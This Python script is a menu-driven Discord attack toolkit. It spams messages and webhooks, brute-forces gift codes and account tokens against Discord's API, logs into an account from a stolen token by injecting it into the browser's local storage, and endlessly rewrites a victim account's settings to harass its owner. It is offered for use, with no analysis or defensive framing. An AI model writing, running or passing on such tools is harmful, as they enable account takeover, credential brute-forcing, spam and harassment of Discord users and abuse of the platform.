import webbrowser
import time
import json
import requests
import selenium
from selenium import webdriver
import pyautogui
import json
import requests
from discord import Webhook, RequestsWebhookAdapter
import threading
import colorama
import os
import random
import string
import ctypes
from colorama import Fore
from colorama import Fore, Style
from bs4 import BeautifulSoup
from itertools import cycle
from urllib.request import *
import sys
import uuid
import socket
import platform


CYAN    = '\033[36m'
BLUE    = '\033[34m'
GREEN   = '\033[32m'
MAGENTA = '\033[35m'
RED     = '\033[31m'
RESET   = '\033[39m'





os.system("cls||clear")
def mainpass():
 print(CYAN + """
  __  __               __      ___                       
 |  \/  |              \ \    / / |                      
 | \  / | __ _ _   _ _ _\ \  / /| | __ _ _   _  ___ _ __ 
 | |\/| |/ _` | | | | '_ \ \/ / | |/ _` | | | |/ _ \ '__|
 | |  | | (_| | |_| | | | \  /  | | (_| | |_| |  __/ |   
 |_|  |_|\__,_|\__, |_| |_|\/   |_|\__,_|\__, |\___|_|   
                __/ |                     __/ |          
               |___/                     |___/           
 """)

 usernamelogin = input(RED + """  Username:  """)
 passwd = input(RED + """  Password:  """)
 passdb = requests.get("https://pastebin.com/raw/bZYmdn9j").text.splitlines()
 if passwd in passdb:
     pass
 else:
     print("""CONSOLE PASSWORD INVALID""")
     time.sleep(1)
     sys.exit()
mainpass()
os.system("cls||clear")

start = input(CYAN + """
     __  ___                _    ____                     
    /  |/  /___ ___  ______| |  / / /___ ___  _____  _____
   / /|_/ / __ `/ / / / __ \ | / / / __ `/ / / / _ \/ ___/
  / /  / / /_/ / /_/ / / / / |/ / / /_/ / /_/ /  __/ /    
 /_/  /_/\__,_/\__, /_/ /_/|___/_/\__,_/\__, /\___/_/     
             /____/                   /____/             
    
    
    [1] spam              [6] Token Gen        
    [2] Token Info        [7] Virus                   
    [3] Webhook Spammer   [8] Token login                        
    [4] Nitro Sniper      [9] Token Fucker                        
    [5] Social            [x] Exit                      
                
 
                                                                     

> Choice: """)
os.system("cls||clear")

request = requests.Session()
if start =='1':
 print()
   
 message = input("what message do want to spam?")
 repeats = int(input("how many times do you wanna send this message? "))
 delay = int(input("how many ms do you want to wait in between each message"))

 isloaded = input("press enter when your ready?")


 print("you have five seconds before the spam starts!")

 time.sleep(5)

 for i in range (0,repeats):
    if message != "":
        pyautogui.typewrite(message)
        pyautogui.press("enter")
 else:
    pyautogui.hotkey('crtl', 'v')
    pyautogui.press("enter")

    time.sleep(delay/1000)

    print("Done\n")





if start =='2': 
 def startmenu():
   token = input('Token: ')
   headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
        }  

   src = request.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers, timeout=10)
   response = json.loads(src.content)

   if src.status_code == 403:
      print("[*] Token Is Invalid")
      startmenu()
   elif src.status_code == 401:
      print("[*] Token Is Invalid")
      startmenu()
   else:
      print("Token Is Valid")
      infotk = f'''\n   Name: {response['username']}#{response['discriminator']}   ID: {response['id']}\n   Email: {response['email']}   Phone: {response['phone']}\n   Language: {response['locale']}\n'''
      print(infotk)
      startmenu()
 startmenu()




if start =='3':
 from re import findall, match
 from base64 import b64decode

 
 allah = input("Select>>")
 colorama.init()
 url = input("Webhook Url>>")
 message = input("Message>>")
 def WebHook():
  
  threading.Thread(target=WebHook).start()
 while True:
  webhook = Webhook.from_url(f"{url}", adapter=RequestsWebhookAdapter())
  webhook.send(f"{message}")
  print(f"{Fore.GREEN}[+] Sent {message}")
  print(f"""
  
                                                                """)

  WebHook()



if start =='4':




   
 try: 
    from discord_webhook import DiscordWebhook 
 except ImportError: 
    input(f"Module discord_webhook not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install discord_webhook'\nPress enter to exit") 
    exit() 
 try: 
    import requests 
 except ImportError: 
    input(f"Module requests not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install requests'\nPress enter to exit")
    exit() 


 class NitroGen:
    def __init__(self): 
        self.fileName = "Nitro Codes.txt" 

    def main(self): 
        os.system('cls' if os.name == 'nt' else 'clear') 
        if os.name == "nt": 
            print("")
            ctypes.windll.kernel32.SetConsoleTitleW("Nitro Generator and Checker -")
        else: 
            print(f'\33]0;Nitro Generator and Checker -\a', end='', flush=True) 

        print("""NITRO SNIPER""") 
        time.sleep(1) 
        self.slowType("Welcome to Nitro Sniper Program!", .02) 
        time.sleep(1) 
        self.slowType("\nEnter How Many Codes to Generate and Check: ", .02, newLine = False) 

        num = int(input('')) 

    
        self.slowType("\nEnter a discord webhook address! \nType here if you want or press enter to ignore: ", .02, newLine = False)
        url = input('') 
        webhook = url if url != "" else None 

   

        valid = [] 
        invalid = 0 

        for i in range(num): 
            try: 
                code = "".join(random.choices( 
                    string.ascii_uppercase + string.digits + string.ascii_lowercase,
                    k = 16
                ))
                url = f"https://discord.gift/{code}" 

                result = self.quickChecker(url, webhook) 

                if result: 
                    valid.append(url) 
                else: 
                    invalid += 1 
            except Exception as e: 
                print(f" Error | {url} ") 

            if os.name == "nt": 
                ctypes.windll.kernel32.SetConsoleTitleW(f"Nitro Generator - {len(valid)} Success | {invalid} Invalid -") 
                print("")
            else: 
                print(f'\33]0;Nitro Generator - {len(valid)} Success | {invalid} Invalid - \a', end='', flush=True) 

        print(f"""
 Results:
 Valid: {len(valid)}
 Invalid: {invalid}
 Valid Codes: {', '.join(valid )}""") 

        input("\nPress Enter to close the program.") 
        [input(i) for i in range(1,0,-1)] 


    def slowType(self, text, speed, newLine = True): 
        for i in text: 
            print(i, end = "", flush = True) 
            time.sleep(speed) 
        if newLine: 
            print() 

    def generator(self, amount): 
        with open(self.fileName, "w", encoding="utf-8") as file: 
            print("Please wait, generate nitro codes...") 

            start = time.time() 

            for i in range(amount): 
                code = "".join(random.choices(
                    string.ascii_uppercase + string.digits + string.ascii_lowercase,
                    k = 16
                )) 

                file.write(f"https://discord.gift/{code}\n") 

            
            print(f"Genned {amount} code | Last time: {round(time.time() - start, 5)}s\n") #

    def fileChecker(self, notify = None): 
        valid = []
        invalid = 0 
        with open(self.fileName, "r", encoding="utf-8") as file: 
            for line in file.readlines(): 
                nitro = line.strip("\n") 

               
                url = f"https://discord.com/api/v6/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"

                response = requests.get(url) 

                if response.status_code == 200: 
                    print(f" Valid | {nitro} ") 
                    valid.append(nitro) 

                    if notify is not None: 
                        DiscordWebhook( 
                            url = notify,
                            content = f"Valid nitro codeee @everyone \n{nitro}"
                        ).execute()
                    else: 
                        break 

                else: 
                    print(f" Invalid | {nitro} ") 
                    invalid += 1 

        return {"valid" : valid, "invalid" : invalid} 

    def quickChecker(self, nitro, notify = None): 
        # Generate the request url
        url = f"https://discord.com/api/v6/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"
        response = requests.get(url) 

        if response.status_code == 200: 
            print(f" Valid | {nitro} ", flush=True, end="" if os.name == 'nt' else "\n") 
            with open("Nitro Codes.txt", "w") as file: 
                file.write(nitro) 

            if notify is not None: 
                DiscordWebhook( 
                    url = notify,
                    content = f"Valid nitro codeee @everyone \n{nitro}"
                ).execute()

            return True 

        else: 
            print(f" Invalid | {nitro} ", flush=True, end="" if os.name == 'nt' else "\n") 
            return False 
 if __name__ == '__main__':
   Gen = NitroGen() 
   Gen.main() 

if start =='5':
 print("""
   _____            _       _ 
 /  ___|          (_)     | |
 \ `--.  ___   ___ _  __ _| |
  `--. \/ _ \ / __| |/ _` | |
 /\__/ / (_) | (__| | (_| | |
 \____/ \___/ \___|_|\__,_|_|
                            
                            
 """)
 
 start = input("""
 [1] Discord username
 [2] My website


 > Choice
  """)
 
 if start =='1':
   print("""
      MaynVlayer#7099
     """) 
   time.sleep(10)
 
 if start =='2':
  webbrowser.open('file:///C:/Users/kkak7/Desktop/MySite/index.html')


if start =='6':
 print("""
  _____     _                _____            
 |_   _|   | |              |  __ \           
   | | ___ | | _____ _ __   | |  \/ ___ _ __  
   | |/ _ \| |/ / _ \ '_ \  | | __ / _ \ '_ \ 
   | | (_) |   <  __/ | | | | |_\ \  __/ | | |
   \_/\___/|_|\_\___|_| |_|  \____/\___|_| |_|

 """)
 
 attempts_per_second = 7 # Keep low or you wil get IP banned (Max 16-17) | See: https://discord.com/developers/docs/topics/rate-limits
    
 def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

 def mfa_crack():
    token = (f"mfa.{(''.join(random.choice(string.hexdigits + '-_') for _ in range(84)))}")
    
    r = requests.get(
        'https://discord.com/api/v9/users/@me',
        headers=getheaders(token))
    
    if r.status_code == 200:
        print(Fore.GREEN + f"- Valid Token. ({token}) | [{r.status_code}] | (Written to file)\n" + Style.RESET_ALL)   
        with open("valid-token.txt", "a") as f:
            f.write(f"\n{token}\n")   
             
    elif r.status_code == 401:
        print(Fore.RED + f"- Invalid Token. ({token}) | [{r.status_code}]\n" + Style.RESET_ALL)
        
    elif r.status_code == 429:
        print(Fore.YELLOW + f"- Rate limit exceded!\n" + Style.RESET_ALL)
        exit()
    
    else:
        print(Fore.YELLOW + f"Unknown error code thrown. Exiting . . . | [{r.status_code}]" + Style.RESET_ALL)
        exit()

 def reg_crack():
    token = (f"{(''.join(random.choice(string.hexdigits) for _ in range(24)))}.{(''.join(random.choice(string.hexdigits) for _ in range(6)))}.{(''.join(random.choice(string.hexdigits + '-_') for _ in range(27)))}")
    
    r = requests.get(
        'https://discord.com/api/v9/users/@me',
        headers=getheaders(token))
    
    if r.status_code == 200:
        print(Fore.GREEN + f"- Valid Token. ({token}) | [{r.status_code}] | (Written to file)\n" + Style.RESET_ALL)    
        with open("valid-token.txt", "a") as f:
            f.write(f"\n{token}\n")    
        
    elif r.status_code == 401:
        print(Fore.RED + f"- Invalid Token. ({token}) | [{r.status_code}]\n" + Style.RESET_ALL)
        
    elif r.status_code == 429:
        print(Fore.YELLOW + f"- Rate limit exceded!\n" + Style.RESET_ALL)
        exit()
    
    else:
        print(Fore.YELLOW + f"Unknown code thrown. Exiting . . . [{r.status_code}]" + Style.RESET_ALL)
        exit()
    
 def main():
    print()
    delay = (1 / attempts_per_second)
    print()
    choice = str(input("[1] Non MFA tokens (quicker to crack)\n[2] MFA tokens (longer to crack)\n>>> "))
    
    if choice == '1':
        while True:
            reg_crack()   
            time.sleep(delay)
            
    if choice == '2':
        while True:
            mfa_crack()   
            time.sleep(delay)

            
    else:
        exit()


 if __name__ == "__main__":
    f = open("valid-token.txt", "w")
    
    try: main()
    except KeyboardInterrupt: 
        print(Style.RESET_ALL + '\n\nKeyboardInterrupt\nClosing . . .')

if start =='7':
 print("""
 ____   ____.__                     
 \   \ /   /|__|______ __ __  ______
  \   Y   / |  \_  __ \  |  \/  ___/
   \     /  |  ||  | \/  |  /\___ \ 
    \___/   |__||__|  |____//____  >
                                \/ 
""")

 start = input("""    [1] Virus [2] Snel scan [3] Windows updates


 choice """)

 if start == '1':
  pyautogui.press('win')








 
 pyautogui.write('Virus')
 pyautogui.press('enter')
 pyautogui.click(400, 600, duration=0.7)
 pyautogui.click(380, 350, duration=0.2)

 if start =='2':
  pyautogui.press('win')
  pyautogui.write('Virus')
  pyautogui.press('enter')
  pyautogui.click(380, 350, duration=0.7)

 if start =='3':
  pyautogui.press('win')
  pyautogui.write('Naar updates zoeken')
  pyautogui.press('enter')


if start =='8':

 try:
     if platform.system() == 'Windows':
         os.system('cls')
     else:
         os.system('clear')
 except:
     pass

 def cyan():
     return '\u001b[36;1m'

 def b_cyan():
     return '\u001b[46;1m'

 def reset():
     return '\u001b[0m'

 RESET   = '\033[39m'
 CYAN    = '\033[36m'


 def ascii():
      
  message = CYAN + """
     ____  ____  ______    ____  ______
    / __ )/ __ \/  _/ /   / __ \/ ____/
   / __  / / / // // /   / / / / / __  
  / /_/ / /_/ // // /___/ /_/ / /_/ /  
 /_____/\____/___/_____/\____/\____/   
  \n\033[36m[\033[39mMade By MaynVlayer\033[36m]\n\n"""

  for char in message:
      sys.stdout.write(char)
      sys.stdout.flush()
      time.sleep(0.002)

 ascii()


 token = input('[\033[39m>\033[36m]\033[39mToken: ')

 def login(_token):
    
         opts = webdriver.ChromeOptions()
         opts.add_experimental_option("detach", True)
         driver = webdriver.Chrome('chromedriver.exe', options=opts)
         script = """
                 function login(token) {
                 setInterval(() => {
                 document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
                 }, 50);
                 setTimeout(() => {
                 location.reload();
                 }, 2500);
                 }   
                """
         driver.get("https://discordapp.com/login")
         driver.execute_script(script+f'\nlogin("{_token}")')
    

 login(token)



if start == "9":


     ErrorMsg = "Invalid token, or you're ratelimited from the endpoint"

     __version__ = "1.0.3"

     def main():
       print(f"Discord User Fucker")
       print(f"Version "+__version__)
       print("")
       print("")

     token = input("Token to fuck\n> ")
     headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
      }    
     request = requests.Session()
     payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'enable_tts_command': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
     }
     try:
         res = request.patch("https://canary.discordapp.com/api/v9/users/@me/settings",headers=headers, json=payload)
         if res.status_code == 401:
             try:
              print(ErrorMsg)
             except:
               pass 
     except Exception as e:
       print(e)
     locales = [ 
        "da", "de",
        "en-GB", "en-US",
        "es-ES", "fr",
        "hr", "it",
        "lt", "hu",
        "nl", "no",
        "pl", "pt-BR",
        "ro", "fi",
        "sv-SE", "vi",
        "tr", "cs",
        "el", "bg",
        "ru", "uk",
        "th", "zh-CN",
        "ja", "zh-TW",
        "ko"
        ]
     modes = cycle(["light", "dark"])
     statuses = cycle(["online", "idle", "dnd", "invisible"])
     while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                ress = request.patch("https://canary.discordapp.com/api/v9/users/@me/settings",headers=headers, json=setting, timeout=10)
                if ress.status_code == 401:
                  try:
                    print(ErrorMsg)
                  except:
                    pass
            except Exception as e:
                print(e)

     if __name__ == '__main__':
      main()






if start =='x':
 time.sleep(0)
 





  





